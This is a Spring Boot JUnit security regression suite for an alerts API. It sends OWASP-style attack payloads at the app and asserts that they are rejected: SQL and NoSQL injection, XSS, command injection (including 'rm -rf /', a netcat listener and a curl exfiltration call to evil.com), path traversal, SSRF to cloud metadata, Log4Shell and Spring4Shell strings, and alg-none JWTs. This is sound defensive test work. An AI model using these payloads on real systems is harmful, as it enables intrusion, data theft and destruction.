package com.eagle.security.tests;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureWebMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import javax.crypto.SecretKey;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.stream.IntStream;

import static org.springframework.security.test.web.servlet.setup.SecurityMockMvcConfigurers.springSecurity;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Suite de testes de regressão de segurança para o Sistema Eagle
 * 
 * Implementa testes automatizados de penetração, validação OWASP Top 10,
 * e testes de regressão de segurança conforme especificado na tarefa 16.4
 * 
 * Cobertura:
 * - Testes de penetração automatizados
 * - Validação conformidade OWASP Top 10
 * - Testes de autorização e controle de acesso
 * - Testes de regressão de segurança
 */
@SpringBootTest
@AutoConfigureWebMvc
@ActiveProfiles("test")
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
public class SecurityRegressionTestSuite {

    // Test Constants
    private static final String BEARER_PREFIX = "Bearer ";
    private static final String TEST_CUSTOMER_DOCUMENT = "12345678901";
    private static final String TEST_START_DATE = "2024-01-01";
    private static final String TEST_END_DATE = "2024-01-31";
    private static final String ADMIN_EMAIL = "admin@eagle.com";
    private static final String USER_EMAIL = "user@eagle.com";
    private static final String KEYCLOAK_ISSUER = "http://localhost:8081/realms/eagle-dev";
    private static final String AUDIENCE = "eagle-services";
    
    // API Endpoints
    private static final String ALERTS_CREATE_ENDPOINT = "/api/v1/alerts/create";
    private static final String ALERTS_SEARCH_ENDPOINT = "/api/v1/alerts/search";
    private static final String AUTH_LOGIN_ENDPOINT = "/api/v1/auth/login";
    private static final String ALERTS_STATUS_ENDPOINT = "/api/v1/alerts/status";
    
    // Security Test Payloads
    private static final String[] SQL_INJECTION_PAYLOADS = {
        "'; DROP TABLE alerts; --",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO alerts VALUES ('malicious'); --",
        "' OR 1=1 --",
        "admin'/*",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --"
    };
    
    private static final String[] XSS_PAYLOADS = {
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "';alert('xss');//",
        "<svg onload=alert('xss')>",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>"
    };
    
    private static final String[] COMMAND_INJECTION_PAYLOADS = {
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "`id`",
        "$(whoami)",
        "; rm -rf /",
        "| nc -l 4444",
        "&& curl http://evil.com/steal?data="
    };
    
    private static final String[] DIRECTORY_TRAVERSAL_PAYLOADS = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
    };
    
    private static final String[] NOSQL_INJECTION_PAYLOADS = {
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"this.password.match(/.*/)\"}"
    };
    
    private static final String[] SSRF_PAYLOADS = {
        "http://localhost:8080/actuator/env",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "ftp://internal-server/sensitive-file",
        "gopher://127.0.0.1:6379/_INFO"
    };
    
    private static final String[] MALICIOUS_INPUTS = {
        "<script>alert('xss')</script>",
        "'; DROP TABLE alerts; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com}",
        "{{7*7}}",
        "%0d%0aSet-Cookie:malicious=true"
    };

    @Autowired
    private WebApplicationContext context;

    @Autowired
    private ObjectMapper objectMapper;

    private MockMvc mockMvc;
    private SecretKey jwtSecret;
    private String validToken;
    private String adminToken;
    private String userToken;
    private ExecutorService executorService;

    @BeforeEach
    void setUp() {
        mockMvc = MockMvcBuilders
                .webAppContextSetup(context)
                .apply(springSecurity())
                .build();

        jwtSecret = Keys.secretKeyFor(SignatureAlgorithm.HS256);
        executorService = Executors.newFixedThreadPool(10);
        
        generateTestTokens();
    }

    @AfterEach
    void tearDown() {
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdown();
            try {
                if (!executorService.awaitTermination(5, TimeUnit.SECONDS)) {
                    executorService.shutdownNow();
                }
            } catch (InterruptedException e) {
                executorService.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }

    private void generateTestTokens() {
        Instant now = Instant.now();
        
        // Token de usuário regular
        userToken = Jwts.builder()
                .setSubject(USER_EMAIL)
                .setIssuer(KEYCLOAK_ISSUER)
                .setAudience(AUDIENCE)
                .setIssuedAt(Date.from(now))
                .setExpiration(Date.from(now.plus(1, ChronoUnit.HOURS)))
                .claim("realm_access", Map.of("roles", new String[]{"USER"}))
                .claim("resource_access", Map.of(AUDIENCE, Map.of("roles", new String[]{"USER"})))
                .claim("preferred_username", "user")
                .claim("email", USER_EMAIL)
                .signWith(jwtSecret)
                .compact();

        // Token de administrador
        adminToken = Jwts.builder()
                .setSubject(ADMIN_EMAIL)
                .setIssuer(KEYCLOAK_ISSUER)
                .setAudience(AUDIENCE)
                .setIssuedAt(Date.from(now))
                .setExpiration(Date.from(now.plus(1, ChronoUnit.HOURS)))
                .claim("realm_access", Map.of("roles", new String[]{"ADMIN", "MICROSERVICE", "ALERT_CREATE", "ALERT_DELETE"}))
                .claim("resource_access", Map.of(AUDIENCE, Map.of("roles", new String[]{"ADMIN"})))
                .claim("preferred_username", "admin")
                .claim("email", ADMIN_EMAIL)
                .signWith(jwtSecret)
                .compact();

        validToken = adminToken; // Default para compatibilidade
    }

    /**
     * Helper method to create a basic alert request
     */
    private Map<String, Object> createBasicAlertRequest() {
        Map<String, Object> request = new HashMap<>();
        request.put("customerDocument", TEST_CUSTOMER_DOCUMENT);
        request.put("scopeStartDate", TEST_START_DATE);
        request.put("scopeEndDate", TEST_END_DATE);
        return request;
    }

    /**
     * Helper method to create alert request with custom customer document
     */
    private Map<String, Object> createAlertRequestWithDocument(String customerDocument) {
        Map<String, Object> request = createBasicAlertRequest();
        request.put("customerDocument", customerDocument);
        return request;
    }

    /**
     * Helper method to perform POST request with authorization
     */
    private void performAuthorizedPost(String endpoint, Object requestBody, String token) throws Exception {
        mockMvc.perform(post(endpoint)
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + token)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(requestBody)))
                .andExpect(status().isBadRequest());
    }

    // ========== TESTES DE PENETRAÇÃO AUTOMATIZADOS ==========

    @Test
    @DisplayName("Penetration Test: Brute Force Attack Protection")
    void shouldProtectAgainstBruteForceAttacks() throws Exception {
        // Simular múltiplas tentativas de login falhadas
        for (int i = 0; i < 10; i++) {
            mockMvc.perform(post(AUTH_LOGIN_ENDPOINT)
                    .contentType(MediaType.APPLICATION_JSON)
                    .content("{\"username\":\"admin\",\"password\":\"wrong" + i + "\"}"))
                    .andExpect(status().isUnauthorized());
        }

        // Após múltiplas tentativas, deve implementar rate limiting
        mockMvc.perform(post(AUTH_LOGIN_ENDPOINT)
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"username\":\"admin\",\"password\":\"wrongpassword\"}"))
                .andExpect(status().isTooManyRequests());
    }

    @Test
    @DisplayName("Penetration Test: SQL Injection Attacks")
    void shouldPreventSqlInjectionAttacks() throws Exception {
        for (String payload : SQL_INJECTION_PAYLOADS) {
            Map<String, Object> request = createAlertRequestWithDocument(payload);
            performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);
        }
    }

    @Test
    @DisplayName("Penetration Test: XSS Attack Prevention")
    void shouldPreventXssAttacks() throws Exception {
        for (String payload : XSS_PAYLOADS) {
            Map<String, Object> request = createBasicAlertRequest();
            request.put("description", payload);
            performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);
        }
    }

    @Test
    @DisplayName("Penetration Test: Command Injection Prevention")
    void shouldPreventCommandInjectionAttacks() throws Exception {
        for (String payload : COMMAND_INJECTION_PAYLOADS) {
            Map<String, Object> request = createAlertRequestWithDocument(TEST_CUSTOMER_DOCUMENT + payload);
            performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);
        }
    }

    @Test
    @DisplayName("Penetration Test: Directory Traversal Prevention")
    void shouldPreventDirectoryTraversalAttacks() throws Exception {
        for (String payload : DIRECTORY_TRAVERSAL_PAYLOADS) {
            mockMvc.perform(get("/api/v1/files/" + payload)
                    .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                    .andExpect(status().isBadRequest());
        }
    }

    // ========== VALIDAÇÃO OWASP TOP 10 2021 ==========

    @Test
    @DisplayName("OWASP A01: Broken Access Control - Horizontal Privilege Escalation")
    void shouldPreventHorizontalPrivilegeEscalation() throws Exception {
        // Usuário tentando acessar dados de outro usuário
        mockMvc.perform(get("/api/v1/customers/other-user-id")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + userToken))
                .andExpect(status().isForbidden());
    }

    @Test
    @DisplayName("OWASP A01: Broken Access Control - Vertical Privilege Escalation")
    void shouldPreventVerticalPrivilegeEscalation() throws Exception {
        // Usuário regular tentando acessar funcionalidades de admin
        mockMvc.perform(delete("/api/v1/alerts/123")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + userToken))
                .andExpect(status().isForbidden());

        mockMvc.perform(get("/api/v1/admin/users")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + userToken))
                .andExpect(status().isForbidden());
    }

    @Test
    @DisplayName("OWASP A02: Cryptographic Failures - Sensitive Data Exposure")
    void shouldNotExposeSensitiveDataInResponses() throws Exception {
        mockMvc.perform(get("/api/v1/alerts/123")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                .andExpect(status().isOk())
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("password"))))
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("secret"))))
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("key"))))
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("token"))));
    }

    @Test
    @DisplayName("OWASP A03: Injection - NoSQL Injection Prevention")
    void shouldPreventNoSqlInjectionAttacks() throws Exception {
        for (String payload : NOSQL_INJECTION_PAYLOADS) {
            Map<String, Object> request = createAlertRequestWithDocument(payload);
            performAuthorizedPost(ALERTS_SEARCH_ENDPOINT, request, adminToken);
        }
    }

    @Test
    @DisplayName("OWASP A04: Insecure Design - Business Logic Bypass")
    void shouldPreventBusinessLogicBypass() throws Exception {
        // Tentar criar alerta com data de fim anterior à data de início
        Map<String, Object> request = new HashMap<>();
        request.put("customerDocument", TEST_CUSTOMER_DOCUMENT);
        request.put("scopeStartDate", "2024-12-31");
        request.put("scopeEndDate", "2024-01-01");

        performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);
    }

    @Test
    @DisplayName("OWASP A05: Security Misconfiguration - Debug Information Exposure")
    void shouldNotExposeDebugInformation() throws Exception {
        // Verificar que endpoints de debug não estão expostos
        mockMvc.perform(get("/actuator/env")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                .andExpect(status().isForbidden());

        mockMvc.perform(get("/actuator/configprops")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                .andExpect(status().isForbidden());

        mockMvc.perform(get("/debug")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                .andExpect(status().isNotFound());
    }

    @Test
    @DisplayName("OWASP A06: Vulnerable Components - Dependency Validation")
    void shouldNotHaveVulnerableDependencies() throws Exception {
        // Este teste seria executado pelo OWASP Dependency Check
        // Aqui validamos que o sistema não aceita uploads de componentes vulneráveis
        
        mockMvc.perform(post("/api/v1/admin/upload-component")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"component\":\"log4j\",\"version\":\"2.14.1\"}"))
                .andExpect(status().isBadRequest());
    }

    @Test
    @DisplayName("OWASP A07: Identification and Authentication Failures")
    void shouldImplementSecureAuthentication() throws Exception {
        // Verificar que senhas fracas são rejeitadas
        Map<String, Object> weakPasswordRequest = new HashMap<>();
        weakPasswordRequest.put("username", "newuser");
        weakPasswordRequest.put("password", "123");
        weakPasswordRequest.put("email", "newuser@eagle.com");

        mockMvc.perform(post("/api/v1/auth/register")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(weakPasswordRequest)))
                .andExpect(status().isBadRequest());
    }

    @Test
    @DisplayName("OWASP A08: Software and Data Integrity Failures")
    void shouldValidateDataIntegrity() throws Exception {
        // Verificar que dados modificados são rejeitados
        Map<String, Object> request = createBasicAlertRequest();
        request.put("checksum", "invalid_checksum");

        performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);
    }

    @Test
    @DisplayName("OWASP A09: Security Logging and Monitoring Failures")
    void shouldLogSecurityEvents() throws Exception {
        // Tentar acesso não autorizado - deve ser logado
        mockMvc.perform(get("/api/v1/admin/sensitive-data")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + userToken))
                .andExpect(status().isForbidden());

        // Verificar que tentativa foi logada (implementação específica necessária)
        // Este teste dependeria da implementação de auditoria
    }

    @Test
    @DisplayName("OWASP A10: Server-Side Request Forgery (SSRF)")
    void shouldPreventSsrfAttacks() throws Exception {
        for (String payload : SSRF_PAYLOADS) {
            Map<String, Object> request = new HashMap<>();
            request.put("webhookUrl", payload);
            request.put("customerDocument", TEST_CUSTOMER_DOCUMENT);

            performAuthorizedPost("/api/v1/webhooks/register", request, adminToken);
        }
    }

    // ========== TESTES DE AUTORIZAÇÃO E CONTROLE DE ACESSO ==========

    @Test
    @DisplayName("Authorization: Role-Based Access Control Matrix")
    void shouldEnforceRoleBasedAccessControl() throws Exception {
        // Matriz de controle de acesso
        Map<String, Map<String, Boolean>> accessMatrix = Map.of(
            "USER", Map.of(
                "GET /api/v1/alerts", true,
                "POST /api/v1/alerts/create", false,
                "DELETE /api/v1/alerts/123", false,
                "GET /api/v1/admin/users", false
            ),
            "ADMIN", Map.of(
                "GET /api/v1/alerts", true,
                "POST /api/v1/alerts/create", true,
                "DELETE /api/v1/alerts/123", true,
                "GET /api/v1/admin/users", true
            )
        );

        // Testar matriz de acesso
        for (Map.Entry<String, Map<String, Boolean>> roleEntry : accessMatrix.entrySet()) {
            String role = roleEntry.getKey();
            String token = role.equals("ADMIN") ? adminToken : userToken;

            for (Map.Entry<String, Boolean> accessEntry : roleEntry.getValue().entrySet()) {
                String endpoint = accessEntry.getKey();
                Boolean shouldHaveAccess = accessEntry.getValue();

                String[] parts = endpoint.split(" ");
                String method = parts[0];
                String path = parts[1];

                MockHttpServletRequestBuilder requestBuilder;
                switch (method) {
                    case "GET":
                        requestBuilder = get(path);
                        break;
                    case "POST":
                        requestBuilder = post(path);
                        break;
                    case "DELETE":
                        requestBuilder = delete(path);
                        break;
                    default:
                        requestBuilder = get(path);
                        break;
                }

                if (shouldHaveAccess) {
                    mockMvc.perform(requestBuilder
                            .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + token))
                            .andExpect(status().isNotIn(403, 401));
                } else {
                    mockMvc.perform(requestBuilder
                            .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + token))
                            .andExpect(status().isForbidden());
                }
            }
        }
    }

    @Test
    @DisplayName("Authorization: Resource-Level Access Control")
    void shouldEnforceResourceLevelAccessControl() throws Exception {
        // Usuário só deve acessar seus próprios recursos
        mockMvc.perform(get("/api/v1/customers/user-123")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + userToken))
                .andExpect(status().isOk());

        mockMvc.perform(get("/api/v1/customers/other-user-456")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + userToken))
                .andExpect(status().isForbidden());
    }

    // ========== TESTES DE REGRESSÃO DE SEGURANÇA ==========

    @Test
    @DisplayName("Security Regression: Previous Vulnerability Fixes")
    void shouldMaintainPreviousSecurityFixes() throws Exception {
        // Teste de regressão para vulnerabilidades já corrigidas
        
        // CVE-2021-44228 (Log4Shell) - verificar que não é possível
        String log4shellPayload = "${jndi:ldap://evil.com/exploit}";
        Map<String, Object> request = createBasicAlertRequest();
        request.put("description", log4shellPayload);

        performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);

        // Spring4Shell - verificar proteção contra class manipulation
        mockMvc.perform(post(ALERTS_CREATE_ENDPOINT)
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken)
                .param("class.module.classLoader.resources.context.parent.pipeline.first.pattern", "malicious")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(Map.of("customerDocument", TEST_CUSTOMER_DOCUMENT))))
                .andExpect(status().isBadRequest());
    }

    @Test
    @DisplayName("Security Regression: Rate Limiting Effectiveness")
    void shouldMaintainRateLimitingEffectiveness() throws Exception {
        // Teste de carga para verificar rate limiting
        CompletableFuture<?>[] futures = IntStream.range(0, 100)
                .mapToObj(i -> CompletableFuture.runAsync(() -> {
                    try {
                        mockMvc.perform(get(ALERTS_STATUS_ENDPOINT)
                                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken));
                    } catch (Exception e) {
                        // Ignorar exceções individuais
                    }
                }, executorService))
                .toArray(CompletableFuture[]::new);

        CompletableFuture.allOf(futures).join();

        // Próxima requisição deve ser limitada
        mockMvc.perform(get(ALERTS_STATUS_ENDPOINT)
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                .andExpect(status().isTooManyRequests());
    }

    @Test
    @DisplayName("Security Regression: JWT Token Validation")
    void shouldMaintainJwtTokenValidation() throws Exception {
        // Verificar que todas as validações JWT ainda funcionam
        
        // Token sem assinatura
        String unsignedToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.";
        mockMvc.perform(get(ALERTS_STATUS_ENDPOINT)
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + unsignedToken))
                .andExpect(status().isUnauthorized());

        // Token com algoritmo alterado
        String noneAlgToken = Jwts.builder()
                .setSubject("admin")
                .setHeader(Map.of("alg", "none"))
                .compact();
        mockMvc.perform(get(ALERTS_STATUS_ENDPOINT)
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + noneAlgToken))
                .andExpect(status().isUnauthorized());
    }

    @Test
    @DisplayName("Security Regression: Input Validation Consistency")
    void shouldMaintainInputValidationConsistency() throws Exception {
        for (String input : MALICIOUS_INPUTS) {
            Map<String, Object> request = createAlertRequestWithDocument(input);
            performAuthorizedPost(ALERTS_CREATE_ENDPOINT, request, adminToken);
        }
    }

    @Test
    @DisplayName("Security Regression: Error Message Information Disclosure")
    void shouldNotDiscloseInformationInErrorMessages() throws Exception {
        // Verificar que mensagens de erro não vazam informações
        mockMvc.perform(get("/api/v1/alerts/nonexistent")
                .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                .andExpect(status().isNotFound())
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("database"))))
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("sql"))))
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("exception"))))
                .andExpect(content().string(org.hamcrest.Matchers.not(
                    org.hamcrest.Matchers.containsStringIgnoringCase("stack"))));
    }

    // ========== TESTES DE PERFORMANCE DE SEGURANÇA ==========

    @Test
    @DisplayName("Security Performance: Authentication Overhead")
    void shouldMaintainAuthenticationPerformance() throws Exception {
        long startTime = System.currentTimeMillis();
        
        // Fazer 100 requisições autenticadas
        for (int i = 0; i < 100; i++) {
            mockMvc.perform(get(ALERTS_STATUS_ENDPOINT)
                    .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken))
                    .andExpect(status().isOk());
        }
        
        long endTime = System.currentTimeMillis();
        long totalTime = endTime - startTime;
        
        // Autenticação não deve adicionar mais que 10ms por requisição em média
        long averageTime = totalTime / 100;
        assert averageTime < 10 : "Authentication overhead too high: " + averageTime + "ms";
    }

    @Test
    @DisplayName("Security Performance: Rate Limiting Efficiency")
    void shouldMaintainRateLimitingEfficiency() throws Exception {
        long startTime = System.currentTimeMillis();
        
        // Testar eficiência do rate limiting
        for (int i = 0; i < 50; i++) {
            mockMvc.perform(get(ALERTS_STATUS_ENDPOINT)
                    .header(HttpHeaders.AUTHORIZATION, BEARER_PREFIX + adminToken));
        }
        
        long endTime = System.currentTimeMillis();
        long totalTime = endTime - startTime;
        
        // Rate limiting não deve adicionar overhead significativo
        long averageTime = totalTime / 50;
        assert averageTime < 20 : "Rate limiting overhead too high: " + averageTime + "ms";
    }
}